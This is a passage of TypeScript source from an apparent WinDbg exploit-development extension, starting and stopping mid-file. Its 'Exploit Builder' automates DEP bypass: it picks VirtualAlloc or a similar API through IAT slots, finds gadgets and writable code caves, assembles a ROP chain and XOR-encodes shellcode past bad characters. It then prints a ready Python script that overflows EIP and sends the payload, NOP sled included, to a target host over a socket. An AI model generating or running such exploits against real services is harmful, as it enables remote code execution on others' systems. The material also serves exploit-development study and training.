      setResult({ command: "rop.api_plan", args: { target, badchars }, success: false, findings: [snapshot], warnings: [], errors: [message] });
      return toDxResult("ROP API Resolution Planner", rows);
    }

    const identity = snapshot.targetIdentity;
    out.section("ROP API Resolution Planner (Phase 1 — discovery only)");
    out.info(`Target: ${snapshot.target.module}!${snapshot.target.symbol} @ ${hex32(snapshot.target.address)} (RVA 0x${snapshot.target.exportRva.toString(16).toUpperCase()})`);
    out.info(`Observed module: ${identity.name} base ${hex32(identity.base)} image base ${hex32(identity.imageBase)} size 0x${identity.sizeOfImage.toString(16).toUpperCase()} timestamp 0x${identity.timeDateStamp.toString(16).toUpperCase()} hash ${identity.hash}`);
    out.info(`Snapshot provenance: stopped-debugger reads; target path ${identity.path || "<unknown>"}`);
    out.info(`Badchars: ${badchars.length > 0 ? badchars.map((b) => b.toString(16).padStart(2, "0").toUpperCase()).join(" ") : "none specified"}`);

    const rows: Array<Record<string, string>> = snapshot.candidates.map((candidate) => ({
      Strategy: candidate.strategy,
      State: candidate.state,
      Owner: candidate.ownerModule,
      Slot: hex32(candidate.slot),
      Pointer: hex32(candidate.pointer),
      Anchor: candidate.anchor?.symbol ?? "",
      Delta: candidate.anchor ? hex32(candidate.anchor.delta) : "",
      "Slot bytes": candidate.slotPayloadSafe ? "safe" : "contains badchar",
      "Address evidence": candidate.exportRvaVerified ? "validated" : "incomplete",
      Recommendation: candidate.recommendation,
    }));
    if (rows.length === 0) {
      rows.push({
        Strategy: "neither", State: "DISCOVERED", Owner: "", Slot: "", Pointer: "", Anchor: "", Delta: "", "Slot bytes": "", "Address evidence": "", Recommendation: "No direct IAT slot or same-image exact-export anchor was established.",
      });
    }
    renderRows("ROP API Resolution Planner", rows);
    const warnings = snapshot.candidates
      .filter((candidate) => !candidate.slotPayloadSafe)
      .map((candidate) => `${candidate.strategy} slot ${hex32(candidate.slot)} contains a forbidden byte; this does not rule out dynamic address construction.`);
    setResult({ command: "rop.api_plan", args: { target, badchars }, success: snapshot.candidates.length > 0, findings: [snapshot], warnings, errors: [] });
    return toDxResult("ROP API Resolution Planner", rows);
  };

  const executeRopApiBuild = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") return helperHelp("rop.api_build");
    const options = isPlainObject(args[0]) ? args[0] : {
      target: args[0], badchars: args[1], continuation: args[2], preserve: args[3], maxGadgets: args[4], owner: args[5], anchor: args[6],
    };
    const target = typeof options.target === "string" ? options.target.trim() : "";
    const badchars = parseBadcharsOption(options.badchars);
    const output = typeof options.output === "string" ? options.output : "eax";
    const preserve = Array.isArray(options.preserve)
      ? options.preserve.filter((value): value is string => typeof value === "string")
      : typeof options.preserve === "string" ? options.preserve.split(/[\s,]+/).filter(Boolean) : [];
    const maxGadgets = options.maxGadgets !== undefined ? Number(options.maxGadgets) : 12;
    const continuation = options.continuation !== undefined ? Number(options.continuation) : undefined;
    const requestedOwner = typeof options.owner === "string" ? options.owner.trim().toLowerCase() : "";
    const requestedAnchor = typeof options.anchor === "string" ? options.anchor.trim().toLowerCase() : "";
    if (!target) {
      const rows = [{ Error: 'rop.api_build requires target and continuation, e.g. rop.api_build("KERNEL32!WriteProcessMemory", "00 0A 0D", 0x10001000, "ecx").' }];
      renderRows("ROP API Resolution Builder", rows);
      return toDxResult("ROP API Resolution Builder", rows);
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP API Resolution Builder", rows);
      return toDxResult("ROP API Resolution Builder", rows);
    }
    const stale = staleCorpusGuard("ROP API Resolution Builder", "rop.api_build");
    if (stale) return stale;
    const snapshot = sc.api_plan(target, badchars);
    if (snapshot.error) {
      const rows = [{ Error: snapshot.error }];
      renderRows("ROP API Resolution Builder", rows);
      return toDxResult("ROP API Resolution Builder", rows);
    }
    const matchesName = (actual: string, requested: string): boolean => actual.toLowerCase().replace(/\.dll$/, "") === requested.replace(/\.dll$/, "");
    const constrainedCandidates = snapshot.candidates.filter((candidate) =>
      (!requestedOwner || matchesName(candidate.ownerModule, requestedOwner))
      && (!requestedAnchor || candidate.anchor?.symbol.toLowerCase() === requestedAnchor));
    if ((requestedOwner || requestedAnchor) && constrainedCandidates.length === 0) {
      const rows = [{ Error: `No Phase 1 candidate matches owner="${requestedOwner || "*"}" anchor="${requestedAnchor || "*"}".` }];
      renderRows("ROP API Resolution Builder", rows);
      return toDxResult("ROP API Resolution Builder", rows);
    }
    const globalFailures: string[] = [];
    if (continuation === undefined) globalFailures.push("A concrete continuation address is required after the final RET.");
    else if (!dwordIsByteSafe(BigInt(continuation), badchars)) globalFailures.push("Continuation address contains a forbidden byte.");
    if (output.toLowerCase() !== "eax") globalFailures.push("Phase 2 currently supports EAX output only.");
    const selected = buildBestApiResolution(currentRopCorpus, constrainedCandidates, { output, preserve, maxGadgets, badchars, continuation });
    if (!selected.candidate || !selected.plan) {
      const rows = selected.attempts.map((attempt) => ({
        Error: `${attempt.candidate.strategy} ${attempt.candidate.anchor?.symbol ?? attempt.candidate.target.symbol}: ${attempt.rejectionReasons.join(" ")}`,
      }));
      if (rows.length === 0) rows.push({ Error: "No address-validated Phase 1 resolution candidate is available. Run rop.api_plan to inspect unresolved imports, thunks, or forwarding." });
      renderRows("ROP API Resolution Builder", rows);
      setResult({ command: "rop.api_build", args: { target, output, preserve, maxGadgets, badchars, continuation }, success: false, findings: [{ snapshot, attempts: selected.attempts }], warnings: rows.map((row) => row.Error), errors: [] });
      return toDxResult("ROP API Resolution Builder", rows);
    }
    const plan = selected.plan;
    out.section("ROP API Resolution Builder (Phase 2)");
    out.info(`Strategy: ${selected.candidate.strategy} | Output: ${output.toUpperCase()} | Expected: ${plan.expectedOutput !== undefined ? hex32(plan.expectedOutput) : "unavailable"}`);
    out.info(`State: ${plan.state} — static composition only; CHAIN_VERIFIED requires debugger execution through rop.prove.`);
    for (const note of plan.notes) out.info(note);
    if (globalFailures.length > 0) {
      out.warn("Global constraints:");
      for (const reason of globalFailures) out.warn(`  ${reason}`);
    }
    for (const reason of plan.unsatisfied.filter((reason) => !globalFailures.includes(reason))) out.warn(reason);
    if (plan.clobbers.length > 0) out.warn(`Clobbers: ${plan.clobbers.join(", ")}`);
    const rejected = selected.attempts.filter((attempt) => attempt.rejectionReasons.length > 0);
    if (rejected.length > 0) {
      out.info(`Candidate evaluation: ${selected.attempts.length} considered; ${rejected.length} rejected.`);
      const groups = new Map<string, string[]>();
      for (const attempt of rejected) {
        const label = attempt.candidate.anchor?.symbol ?? attempt.candidate.target.symbol;
        for (const reason of attempt.rejectionReasons.filter((reason) => !globalFailures.includes(reason))) {
          groups.set(reason, [...(groups.get(reason) ?? []), label]);
        }
      }
      for (const [reason, labels] of groups) {
        const examples = labels.slice(0, 3).join(", ");
        const suffix = labels.length > 3 ? `, +${labels.length - 3} more` : "";
        out.warn(`${reason} (${labels.length} candidate${labels.length === 1 ? "" : "s"}: ${examples}${suffix})`);
      }
    }
    const rows: Array<Record<string, string>> = plan.steps.map((step, index) => ({
      Index: String(index), Type: step.kind, Value: step.address !== undefined ? hex32(step.address) : step.value !== undefined ? hex32(BigInt(step.value)) : step.placeholder ?? "", Meaning: step.comment,
    }));
    if (rows.length === 0) rows.push({ Index: "", Type: "none", Value: "", Meaning: plan.unsatisfied.join(" ") || "No chain constructed." });
    if (plan.state === "CHAIN_CONSTRUCTED") {
      out.section("Python — API Resolution Fragment");
      out.info(`# Resolves ${selected.candidate.target.module}!${selected.candidate.target.symbol} into EAX; it does not construct or invoke the API call frame.`);
      out.info(`# Expected EAX: ${plan.expectedOutput !== undefined ? hex32(plan.expectedOutput) : "unknown"}`);
      if (plan.clobbers.length > 0) out.info(`# Clobbers: ${plan.clobbers.join(", ")}`);
      for (const line of formatChainPython({ steps: plan.steps })) out.print(line);
    }
    renderRows("ROP API Resolution Builder", rows);
    setResult({
      command: "rop.api_build", args: { target, output, preserve, maxGadgets, badchars, continuation, owner: requestedOwner || undefined, anchor: requestedAnchor || undefined }, success: plan.state === "CHAIN_CONSTRUCTED",
      findings: [{ snapshot, candidate: selected.candidate, plan, attempts: selected.attempts }], warnings: [...plan.unsatisfied, ...rejected.flatMap((attempt) => attempt.rejectionReasons)], errors: [],
    });
    return toDxResult("ROP API Resolution Builder", rows);
  };

  const API_IAT_NAMES: Record<string, string> = {
    VirtualProtect: "VirtualProtect",
    VirtualAlloc: "VirtualAlloc",
    WriteProcessMemory: "WriteProcessMemory",
    VirtualProtectEx: "VirtualProtectEx",
    VirtualAllocEx: "VirtualAllocEx",
    WinExec: "WinExec",
  };

  const executeRopGenerate = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.generate");
    }

    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("Exploit Builder", rows);
      return toDxResult("Exploit Builder", rows);
    }
    const exploitStale = staleCorpusGuard("Exploit Builder", "rop.generate");
    if (exploitStale) return exploitStale;

    const options = isPlainObject(args[0])
      ? args[0]
      : { api: args[0], shellcode: args[1], badchars: args[2], module: args[3], offset: args[4] };

    const SUPPORTED_APIS = ["VirtualProtect", "VirtualAlloc", "WriteProcessMemory", "WinExec", "VirtualProtectEx", "VirtualAllocEx"];
    const DEP_BYPASS_APIS = ["VirtualProtect", "VirtualAlloc", "WriteProcessMemory", "VirtualProtectEx", "VirtualAllocEx"];

    // IAT slot discovery helper — returns slot address or undefined.
    // sc.iat_find returns a DxResult directly (not through setResult/lastResult),
    // so we read the Slot field from the returned DxResult's rows.
    const discoverIatSlot = (apiName: string): number | undefined => {
      const iatName = API_IAT_NAMES[apiName];
      if (!iatName) return undefined;
      try {
        const scNs = api.sc as Record<string, (...a: unknown[]) => unknown> | undefined;
        if (scNs && typeof scNs.iat_find === "function") {
          const dxResult = scNs.iat_find(iatName) as { rows?: { length: number; [i: number]: Record<string, string> } } | undefined;
          if (dxResult?.rows && dxResult.rows.length > 0) {
            const firstRow = dxResult.rows[0];
            const slotStr = String((firstRow as Record<string, string>).Slot ?? "");
            const match = /0x([0-9a-fA-F]+)/i.exec(slotStr);
            if (match) return parseInt(match[1], 16) >>> 0;
          }
        }
      } catch { /* not available */ }
      return undefined;
    };

    // Badchar check on a DWORD
    const isDwordBadcharFree = (value: number, bad: number[]): boolean => {
      if (bad.length === 0) return true;
      const badSet = new Set(bad.map(b => b & 0xff));
      const v = value >>> 0;
      for (let i = 0; i < 4; i++) if (badSet.has((v >>> (i * 8)) & 0xff)) return false;
      return true;
    };

    const badchars = parseBadcharsOption(options.badchars);
    const isAutoApi = String(options.api ?? "").toLowerCase() === "auto";

    // ── API auto-selection ───────────────────────────────────────────────
    let strategyName: string | undefined;

    if (isAutoApi) {
      out.section("API Auto-Selection");
      out.info("Evaluating DEP bypass candidates...");

      interface ApiCandidate {
        api: string;
        iatSlot?: number;
        slotClean: boolean;
        argCount: number;
        reason: string;
        score: number;
      }
      const candidates: ApiCandidate[] = [];

      for (const apiName of DEP_BYPASS_APIS) {
        const slot = discoverIatSlot(apiName);
        const argCount = { VirtualProtect: 4, VirtualAlloc: 4, WriteProcessMemory: 5, VirtualProtectEx: 5, VirtualAllocEx: 5, WinExec: 2 }[apiName] ?? 0;
        const slotClean = slot !== undefined ? isDwordBadcharFree(slot, badchars) : false;

        let score = 0;
        const reasons: string[] = [];

        if (slot !== undefined) {
          score += 50;
          reasons.push("IAT slot found");
          if (slotClean) {
            score += 20;
            reasons.push("slot address badchar-free");
          } else {
            score -= 10;
            reasons.push("slot address contains badchar(s)");
          }
        } else {
          reasons.push("IAT slot NOT found");
        }

        // Prefer simpler APIs (fewer args = shorter chain = less room for error)
        score += Math.max(0, 10 - argCount * 2);
        if (argCount <= 4) reasons.push(`${argCount} args (compact frame)`);
        else reasons.push(`${argCount} args`);

        // VirtualAlloc is most commonly taught/used in OSED
        if (apiName === "VirtualAlloc") { score += 5; reasons.push("preferred default"); }

        // Ex variants are less common in imports
        if (apiName.endsWith("Ex")) { score -= 5; reasons.push("Ex variant (less common)"); }

        candidates.push({ api: apiName, iatSlot: slot, slotClean, argCount, reason: reasons.join("; "), score });
      }

      // Sort by score descending
      candidates.sort((a, b) => b.score - a.score);

      // Report all candidates
      for (const c of candidates) {
        const status = c.iatSlot !== undefined
          ? `${hex32(c.iatSlot)}${c.slotClean ? "" : " [BADCHAR]"}`
          : "not found";
        const marker = c === candidates[0] ? " ← SELECTED" : "";
        out.info(`  ${c.api.padEnd(20)} IAT: ${status.padEnd(24)} Score: ${String(c.score).padStart(3)}  (${c.reason})${marker}`);
      }

      const best = candidates[0];
      if (best.iatSlot === undefined) {
        out.warn("No API found in IAT. The selected candidate will require a manual iatSlot override.");
      }
      strategyName = best.api;
      out.info(`Selected: ${strategyName} (score ${best.score})`);
    } else {
      strategyName = normalizeExploitStrategy(String(options.api ?? "VirtualAlloc"));
      if (
        !strategyName ||
        strategyName === "Stack Pivot" ||
        strategyName === "LoadLibraryA" ||
        strategyName === "GetProcAddress"
      ) {
        const rows = [{
          Error: "rop.generate supports VirtualProtect, VirtualAlloc, WriteProcessMemory, WinExec, Ex variants, or 'auto'. Got: " + String(options.api ?? "(none)"),
        }];
        renderRows("Exploit Builder", rows);
        return toDxResult("Exploit Builder", rows);
      }
    }

    const shellcodeHex = String(options.shellcode ?? "");
    const entrySkew = Number(options.entrySkew ?? 0);
    const pythonLines: string[] = [];
    const allWarnings: string[] = [];
    const allErrors: string[] = [];

    out.section(`Exploit Builder — ${strategyName}`);

    // --- Step 1: Resolve IAT slot ---
    let iatSlotAddr: number | undefined;
    if (options.iatSlot !== undefined) {
      iatSlotAddr = Number(options.iatSlot) >>> 0;
      out.info(`IAT slot: ${hex32(iatSlotAddr)} (user-supplied)`);
    } else {
      iatSlotAddr = discoverIatSlot(strategyName);
      if (iatSlotAddr !== undefined) {
        out.info(`IAT slot: ${hex32(iatSlotAddr)} (auto-discovered for ${strategyName})`);
      } else {
        allWarnings.push(`Could not auto-discover IAT slot for ${strategyName}. Pass iatSlot manually, or run: dx @$osed().sc.iat_find("${strategyName}")`);
        out.warn(`IAT slot not found — use iatSlot parameter or run sc.iat_find("${strategyName}")`);
      }
    }

    // --- Step 2: Resolve writable buffer address ---
    let bufAddr: string | undefined;
    if (options.buf !== undefined) {
      bufAddr = typeof options.buf === "number"
        ? `0x${(options.buf >>> 0).toString(16).padStart(8, "0")}`
        : String(options.buf).trim();
      out.info(`Buffer: ${bufAddr} (user-supplied)`);
    } else {
      try {
        const cavesResult = registry.execute("code_caves", {
          module: options.module,
          minSize: 0x200,
          maxResults: 5,
        });
        if (cavesResult.success && cavesResult.findings.length > 0) {
          const cave = cavesResult.findings.find(
            (c) => (c as Record<string, unknown>).writable === true,
          ) as Record<string, unknown> | undefined;
          if (cave) {
            const caveAddr = String(cave.address ?? "");
            const addrMatch = /0x([0-9a-fA-F]+)/i.exec(caveAddr);
            if (addrMatch) {
              bufAddr = `0x${addrMatch[1]}`;
              const caveSize = cave.size ?? "?";
              out.info(`Buffer: ${bufAddr} (code cave, ${caveSize} bytes, module: ${cave.module ?? "?"})`);
            }
          } else {
            allWarnings.push("Code caves found but none confirmed writable. Pass buf address, or verify with !vprot.");
            out.warn("Code caves found but none writable — use buf parameter or verify with !vprot");
          }
        }
      } catch { /* fall through */ }
      if (!bufAddr) {
        allWarnings.push("Could not auto-discover writable buffer. Pass buf address, or run: dx @$osed().code_caves(module)");
        out.warn("Writable buffer not found — use buf parameter or run code_caves()");
        bufAddr = "BUF";
      }
    }

    // --- Step 3: Find return gadget ---
    let retGadgetAddr: bigint | undefined;
    let retGadgetSeq = "";
    const jmpEspCandidates = currentRopCorpus.query({
      capability: "DISPATCH_JMP_REGISTER",
      executableOnly: true,
    });
    const jmpEsp = jmpEspCandidates.find((g) => {
      const cap = g.capabilities.find((c) => c.kind === "DISPATCH_JMP_REGISTER");
      return cap && cap.register === "esp";
    });
    if (jmpEsp) {
      retGadgetAddr = firstKnownAddress(jmpEsp);
      retGadgetSeq = jmpEsp.instructions.map((i) => i.normalizedText || i.originalText).join(" ; ");
    }

    let retAddrWord: FrameWord;
    if (options.retAddr !== undefined) {
      const ra = typeof options.retAddr === "number"
        ? `0x${(options.retAddr >>> 0).toString(16)}`
        : String(options.retAddr).trim();
      if (/^(0x)?[0-9a-fA-F]+$/.test(ra)) {
        retAddrWord = { value: parseInt(ra.replace(/^0x/i, ""), 16) >>> 0, comment: "return address (user-supplied)" };
      } else {
        retAddrWord = { placeholder: ra.toUpperCase(), comment: "return address (user-supplied placeholder)" };
      }
    } else if (retGadgetAddr !== undefined) {
      retAddrWord = { value: Number(retGadgetAddr), comment: `return via: ${retGadgetSeq}` };
      out.info(`Return gadget: ${hex32(retGadgetAddr)} — ${retGadgetSeq}`);
    } else {
      retAddrWord = { placeholder: "RETADDR", comment: "return address — find jmp esp or similar" };
      allWarnings.push("No jmp esp gadget found for post-call return. Supply retAddr or find one with: rop.query({capability: 'DISPATCH_JMP_REGISTER'})");
      out.warn("No jmp esp found — supply retAddr or query the corpus");
    }

    // --- Step 4: Find writable address for out-params ---
    let writableWord: FrameWord;
    if (options.writable !== undefined) {
      writableWord = { value: Number(options.writable) >>> 0, comment: "writable dword (out-param sink)" };
    } else {
      const bufParsed = /^0x([0-9a-fA-F]+)$/i.exec(bufAddr);
      if (bufParsed) {
        writableWord = { value: (parseInt(bufParsed[1], 16) + 0x100) >>> 0, comment: "writable dword (BUF+0x100, out-param sink)" };
      } else {
        writableWord = { placeholder: "WRITABLE", comment: "any writable dword for out-param" };
      }
    }

    // --- Step 5: Build the frame ---
    const frame = buildExploitFrame(strategyName, retAddrWord, writableWord);
    const frameSpec = frame
      .map((w) => {
        if (w.derefSlot !== undefined) return `[${hex32(w.derefSlot)}]`;
        if (w.placeholder) return w.placeholder;
        return hex32(w.value!);
      })
      .join(" ");

    // --- Step 6: Build slot_call chain ---
    let chainPlan: SlotDispatchPlan | undefined;
    if (iatSlotAddr !== undefined) {
      chainPlan = planSlotDispatch(
        currentRopCorpus,
        /^0x[0-9a-fA-F]+$/i.test(bufAddr)
          ? { value: parseInt(bufAddr.replace(/^0x/i, ""), 16) >>> 0 }
          : { placeholder: bufAddr.toUpperCase() },
        iatSlotAddr,
        frame,
        badchars,
        buildStableAddressPredicate(),
        entrySkew,
      );

      if (chainPlan.success) {
        out.info(`Chain: ${chainPlan.steps.length} steps, ${chainPlan.stackBytes} bytes`);
        if (chainPlan.placeholders.length > 0) {
          out.info(`Placeholders to resolve: ${chainPlan.placeholders.join(", ")}`);
        }
      } else {
        for (const u of chainPlan.unsatisfied) {
          allWarnings.push(u);
          out.warn(u);
        }
      }
    }

    // --- Step 7: Encode shellcode ---
    let encodeResult: Record<string, unknown> | undefined;
    if (shellcodeHex.trim().length > 0) {
      try {
        const encResult = registry.execute("encode", {
          shellcode: shellcodeHex,
          exclude: badchars.length > 0 ? badchars : [0, 10, 13],
        });
        if (encResult.success && encResult.findings.length > 0) {
          encodeResult = encResult.findings[0] as Record<string, unknown>;
          out.info(`Shellcode: ${(encodeResult.totalSize as number)} bytes (key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes)`);
        } else {
          for (const e of encResult.errors) allErrors.push(e);
          for (const w of encResult.warnings) allWarnings.push(w);
        }
      } catch (err) {
        allWarnings.push(`Shellcode encoding failed: ${err instanceof Error ? err.message : String(err)}`);
      }
    }

    // --- Step 8: Generate Python exploit ---
    out.section("Python Exploit");
    pythonLines.push("#!/usr/bin/env python3");
    pythonLines.push(`# ${strategyName} DEP bypass exploit — generated by osed-windbg rop.generate()`);
    pythonLines.push("import socket");
    pythonLines.push("from struct import pack");
    pythonLines.push("");
    pythonLines.push("# ---- Configuration ----");
    pythonLines.push(`target_host = "192.168.1.100"  # TODO: set target`);
    pythonLines.push(`target_port = 9999             # TODO: set port`);
    pythonLines.push(`total_length = 5000             # TODO: set buffer size`);
    if (options.offset !== undefined) {
      pythonLines.push(`offset = ${Number(options.offset)}                  # EIP offset from triage/pattern_offset`);
    } else {
      pythonLines.push(`offset = 0                     # TODO: set EIP offset from triage/pattern_offset`);
    }
    pythonLines.push("");

    if (chainPlan?.success) {
      pythonLines.push("# ---- ROP Chain ----");
      pythonLines.push('rop = b""');
      for (const step of chainPlan.steps) {
        const word = step.kind === "gadget"
          ? hex32(step.address!)
          : step.placeholder ?? hex32(step.value!);
        pythonLines.push(`rop += pack("<I", ${word})  # ${step.comment}`);
      }
      pythonLines.push("");
    } else {
      pythonLines.push("# ---- ROP Chain (could not auto-build — see warnings) ----");
      pythonLines.push('rop = b""');
      pythonLines.push(`# TODO: Build chain manually with rop.slot_call("${bufAddr}", "${iatSlotAddr !== undefined ? hex32(iatSlotAddr) : "IAT_SLOT"}", "${frameSpec}", "${badchars.map((b) => b.toString(16).padStart(2, "0")).join(" ")}")`);
      pythonLines.push("");
    }

    if (encodeResult) {
      const combined = encodeResult.combined as number[];
      const pyBytes = combined.map((b: number) => `\\x${(b & 0xff).toString(16).padStart(2, "0")}`).join("");
      pythonLines.push("# ---- Encoded Shellcode ----");
      pythonLines.push(`# XOR key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes, payload: ${encodeResult.encodedSize} bytes`);
      const CHUNK = 60;
      const fullStr = `b"${pyBytes}"`;
      if (fullStr.length <= 100) {
        pythonLines.push(`shellcode = ${fullStr}`);
      } else {
        pythonLines.push('shellcode = b""');
        for (let i = 0; i < combined.length; i += CHUNK) {
          const chunk = combined.slice(i, i + CHUNK);
          const chunkStr = chunk.map((b: number) => `\\x${(b & 0xff).toString(16).padStart(2, "0")}`).join("");
          pythonLines.push(`shellcode += b"${chunkStr}"`);
        }
      }
      pythonLines.push("");
    } else if (shellcodeHex.trim().length > 0) {
      pythonLines.push("# ---- Shellcode (encoding failed — see warnings) ----");
      pythonLines.push(`shellcode = b""  # TODO: encode manually with encode("${shellcodeHex.slice(0, 20)}...", badchars)`);
      pythonLines.push("");
    } else {
      pythonLines.push("# ---- Shellcode ----");
      pythonLines.push('shellcode = b""  # TODO: paste msfvenom output or use encode()');
      pythonLines.push("");
    }

    pythonLines.push("# ---- NOP sled (optional) ----");
    pythonLines.push("nops = b\"\\x90\" * 16");
    pythonLines.push("");
    pythonLines.push("# ---- Assemble payload ----");
    pythonLines.push('padding = b"A" * offset');
    pythonLines.push("# The EIP overwrite: first gadget of the ROP chain");
    if (chainPlan?.success && chainPlan.steps.length > 0) {
      const eipStep = chainPlan.steps[0];
      const eipWord = eipStep.kind === "gadget" ? hex32(eipStep.address!) : eipStep.placeholder ?? hex32(eipStep.value!);
      pythonLines.push(`eip = pack("<I", ${eipWord})  # ${eipStep.comment}`);
      pythonLines.push("# rop[4:] is the rest of the chain (eip already consumed the first dword)");
      pythonLines.push("chain_body = rop[4:]");
    } else {
      pythonLines.push('eip = pack("<I", 0x41414141)  # TODO: first gadget address');
      pythonLines.push("chain_body = rop");
    }
    pythonLines.push("");
    pythonLines.push("payload = padding + eip + chain_body + nops + shellcode");
    pythonLines.push('payload += b"C" * (total_length - len(payload))');
    pythonLines.push("");
    pythonLines.push("# ---- Send ----");
    pythonLines.push("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)");
    pythonLines.push("s.connect((target_host, target_port))");
    pythonLines.push("# s.recv(1024)  # banner");
    pythonLines.push("s.send(payload)");
    pythonLines.push("s.close()");
    pythonLines.push(`print(f"[*] Sent {len(payload)} bytes to {target_host}:{target_port}")`);

    for (const line of pythonLines) {
      out.print(line);
    }

    // --- Warnings and summary ---
    for (const w of allWarnings) out.warn(w);
    for (const e of allErrors) out.error(e);

    const rows: Array<Record<string, string>> = [
      {
        API: strategyName,
        "IAT Slot": iatSlotAddr !== undefined ? hex32(iatSlotAddr) : "not found",
        Buffer: bufAddr,
        Chain: chainPlan?.success ? `${chainPlan.steps.length} steps` : "incomplete",
        Shellcode: encodeResult ? `${encodeResult.totalSize} bytes` : "none",
        Return: retGadgetAddr !== undefined ? hex32(retGadgetAddr) : "placeholder",
      },
    ];
    renderRows("Exploit Builder", rows);
    setResult({
      command: "rop.generate",
      args: { ...options, resolvedApi: strategyName },
      success: (chainPlan?.success ?? false) && allErrors.length === 0,
      findings: [{ python: pythonLines, chain: chainPlan, encode: encodeResult }],
      warnings: allWarnings,
      errors: allErrors,
    });
    if (chainPlan?.success && chainPlan.steps.length > 0) {
      lastGeneratedProofInput = { chain: chainPlan.steps, corpus: currentRopCorpus, api: strategyName };
    }
    return toDxResult("Exploit Builder", rows);
  };

  const executeRopProve = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") return helperHelp("rop.prove");
    const controller = new ProofController({
      adapter: new WinDbgProofAdapter(),
      store: proofSessionStore,
      getDefaultInput: () => lastGeneratedProofInput,
      getCorpus: () => currentRopCorpus,
      writeText: writeProofText,
    });
    const options = args.length === 0
      ? undefined
      : isPlainObject(args[0])
        ? args[0]
        : typeof args[0] === "string"
          ? { [/^(status|cancel|history|export)$/i.test(args[0]) ? "action" : "mode"]: args[0], orphans: args[1], path: args[2] }
          : {};
    const outcome = controller.execute(options);
    const rows: Array<Record<string, string>> = [];
    if (outcome.error) {
      rows.push({ Error: outcome.error });
    } else if (outcome.history) {
      for (const session of outcome.history) {
        rows.push({
          Session: session.id,
          State: session.state,
          Execution: session.executionStatus,
          Objective: session.objectiveStatus,
          Checkpoint: `${session.checkpointIndex}/${session.plan.checkpoints.length}`,
        });
      }
      if (rows.length === 0) rows.push({ Session: "none", State: "IDLE", Execution: "UNVERIFIED", Objective: "UNVERIFIED", Checkpoint: "0/0" });
    } else if (outcome.session) {
      const session = outcome.session;
      rows.push({
        Session: session.id,
        State: session.state,
        Execution: session.executionStatus,
        Objective: session.objectiveStatus,
        Checkpoint: `${session.checkpointIndex}/${session.plan.checkpoints.length}`,
        Next: session.ownedBreakpoint ? `0x${session.ownedBreakpoint.address.toString(16).toUpperCase().padStart(8, "0")}` : "none",
        Reason: session.objectiveReason,
      });
    } else if (outcome.orphanResults) {
      for (const result of outcome.orphanResults) rows.push({ Session: "orphan", State: result.status, Execution: "UNVERIFIED", Objective: "UNVERIFIED", Checkpoint: "n/a" });
    }
    renderRows("ROP Proof", rows);
    const errors = outcome.error ? [outcome.error] : [];
    setResult({
      command: "rop.prove",
      args: options ?? {},
      success: outcome.success,
      findings: [outcome],
      warnings: outcome.session?.executionStatus === "UNVERIFIED" ? ["Execution remains UNVERIFIED."] : [],
      errors,
    });
    return toDxResult("ROP Proof", rows);
  };

  // ── rop.verify ─────────────────────────────────────────────────────────

  const executeRopVerify = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.verify");
    }

    const options = isPlainObject(args[0])
      ? args[0]
      : { chain: typeof args[0] === "string" ? args[0] : undefined, badchars: args[1], api: args[2] };
    const badchars = parseBadcharsOption(options.badchars ?? (lastResult?.args as Record<string, unknown> | undefined)?.badchars);

    // Determine the chain to verify: manual chain string, or last rop.generate result
    let steps: import("./rop/chain").ChainStep[];
    let sourceLabel: string;

    if (typeof options.chain === "string" && options.chain.trim().length > 0) {
      steps = parseManualChain(options.chain);
      sourceLabel = `manual chain (${steps.length} DWORDs)`;
    } else if (
      lastResult?.command === "rop.generate" &&
      lastResult.success &&
      lastResult.findings.length > 0
    ) {
      const genResult = lastResult.findings[0] as Record<string, unknown>;
      const chainPlan = genResult.chain as { steps: import("./rop/chain").ChainStep[] } | undefined;
      if (chainPlan?.steps && chainPlan.steps.length > 0) {
        steps = chainPlan.steps;
        sourceLabel = `last rop.generate result (${steps.length} DWORDs)`;
      } else {
        const rows = [{ Error: "Last rop.generate did not produce a complete chain. Supply a manual chain or re-run rop.generate." }];
        renderRows("Chain Verifier", rows);
        return toDxResult("Chain Verifier", rows);
      }
    } else {
      const rows = [{ Error: "No chain to verify. Run rop.generate first, or pass {chain: \"ADDR1 ADDR2 ...\"}" }];
      renderRows("Chain Verifier", rows);
      return toDxResult("Chain Verifier", rows);
    }

    const api_name = options.api
      ? String(options.api)
      : lastResult?.command === "rop.generate"
        ? String((lastResult.args as Record<string, unknown>)?.resolvedApi ?? "") || undefined
        : undefined;
    const report: VerificationReport = verifyChain({
      steps,
      badchars,
      api: api_name,
      corpus: currentRopCorpus ?? undefined,
      expectedArgCount: options.expectedArgCount ? Number(options.expectedArgCount) : undefined,
    });

    // ── Format output ──────────────────────────────────────────────────
    out.section(`Chain Verifier — ${sourceLabel}`);

    // Static report
    out.section("Static Analysis");
    out.info(`DWORDs: ${report.static.dwordCount}  |  Stack: ${report.static.totalStackBytes} bytes  |  Alignment: ${report.static.alignment}`);

    if (report.static.badcharHits.length > 0) {
      out.error(`Bad character violations: ${report.static.badcharHits.length}`);
      for (const hit of report.static.badcharHits) {
        out.error(`  [${hit.stepIndex}] ${hit.dwordHex} — byte ${hit.bytePosition} = 0x${hit.byte.toString(16).padStart(2, "0")} @ offset ${hit.byteOffset} — ${hit.comment}`);
      }
    } else if (badchars.length > 0) {
      out.info("Bad characters: CLEAN — no violations found");
    }

    if (report.static.unresolvedPlaceholders.length > 0) {
      out.warn(`Unresolved placeholders: ${report.static.unresolvedPlaceholders.length}`);
      for (const p of report.static.unresolvedPlaceholders) {
        out.warn(`  [${p.stepIndex}] ${p.placeholder} @ offset ${p.byteOffset} — ${p.comment}`);
      }
    }

    if (report.static.frameCheck) {
      const fc = report.static.frameCheck;
      if (fc.status === "ok") {
        out.info(`Frame check: ${fc.detail}`);
      } else if (fc.status === "not_checked") {
        out.warn(`Frame check: ${fc.detail}`);
      } else if (fc.status === "unknown_api") {
        out.warn(`Frame check: ${fc.detail}`);
      } else {
